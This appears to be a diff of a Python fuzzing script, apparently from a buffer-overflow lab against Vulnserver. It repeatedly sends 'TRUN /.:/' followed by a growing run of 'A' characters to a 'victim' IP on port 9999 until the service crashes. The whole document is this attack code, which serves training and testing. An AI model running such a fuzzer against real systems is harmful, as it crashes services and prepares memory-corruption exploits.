@@ -1,14 +1,21 @@
+#!/usr/bin/python
 import os  
-import socket
+import sys,socket
+from time import sleep
+buff = "A" * 100                                                    # Sending 100 * A characters
+victimIp = '192.168.100.78'                                         # Enter Victim's IP Address 
+victimPort = 9999
 
-buff = b'A' * 3000                   ## Sending 3000 * A Characters
-victim_ip = //Enter victim IP HERE//
+while True:
+    try:
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        # Create the socket
+        s.connect((victimIp,victimPort))
+        s.send(('TRUN /.:/' + buff))
+        s.close()
+        sleep(1)
+        buff = buff + "A" * 100
+    except:
+        print "Fuzzing Crashed at %s bytes" % str(len(buff))
+        sys.exit()
 
-# Create the socket
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((victim_ip,9999))
-print(s.recv(1024))
-s.send(b'TRUN /.:/'+buff)
-print(str(s.recv(1024)))
-s.close()
 
